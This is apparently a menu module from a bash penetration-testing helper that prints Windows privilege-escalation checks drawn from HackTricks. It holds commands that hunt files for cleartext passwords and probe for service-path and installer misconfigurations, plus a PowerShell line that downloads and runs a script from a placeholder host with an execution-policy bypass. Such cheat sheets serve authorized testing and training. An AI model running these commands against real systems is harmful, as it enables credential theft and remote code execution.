#!/bin/bash
# Module: Windows Hardening & PrivEsc (HackTricks Methodology)

function run_windows_hardening() {
    print_banner
    echo -e "${C6}[WINDOWS HARDENING & PRIVESC MODULE]${NC}"
    echo -e "Based on: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation"
    echo -e "----------------------------------------------------------------------------"
    echo -e "1) 🔍  System Information & Patches (systeminfo)"
    echo -e "2) ⚙️   Unquoted Service Paths (Quick Check)"
    echo -e "3) 🔑  Search for Passwords in Files (Unattend/Config)"
    echo -e "4) 🛡️   AlwaysInstallElevated Check"
    echo -e "5) 🌐  Network Connections & Routing"
    echo -e "6) 🛠️   Commands for WinPEAS / PowerUp (Quick Copy)"
    echo -e "0) ↩️   Return to Main Menu"

    echo -ne "\n${C5}Windows Selection: ${NC}"
    read wopt

    case $wopt in
        1)
            echo -e "\n[*] Run this on the target Windows machine:"
            echo -e "${C6}systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"${NC}"
            echo -e "[!] Check missing KBs for Kernel Exploits using 'Watson' or 'Sherlock'."
            ;;
        2)
            echo -e "\n[*] Search for Unquoted Service Paths (Vulnerable to path hijacking):"
            echo -e "${C6}wmic service get name,displayname,pathname,startmode | findstr /i \"Reference\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"${NC}"
            ;;
        3)
            echo -e "\n[*] Searching for cleartext passwords in common locations:"
            echo -e " - Unattend.xml / sysprep.inf"
            echo -e " - Web.config / app.config"
            echo -e "${C6}dir /s /b *pass* *vnc* *config* / findstr /i \"password\"${NC}"
            ;;
        4)
            echo -e "\n[*] Checking Registry for AlwaysInstallElevated (MSI PrivEsc):"
            echo -e "${C6}reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated${NC}"
            echo -e "${C6}reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated${NC}"
            ;;
        5)
            echo -e "\n[*] Check established connections and listening ports:"
            echo -e "${C6}netstat -ano | findstr LISTENING${NC}"
            ;;
        6)
            echo -e "\n[*] Common Tools Download & Run Commands:"
            echo -e " - WinPEAS: ${C4}powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://your-ip/winPEAS.ps1')\"${NC}"
            echo -e " - PowerUp: ${C4}powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"${NC}"
            ;;
        0) return ;;
        *) echo -e "${C1}Invalid selection.${NC}" ; sleep 1 ;;
    esac
    read -p "Press Enter to return..."
}
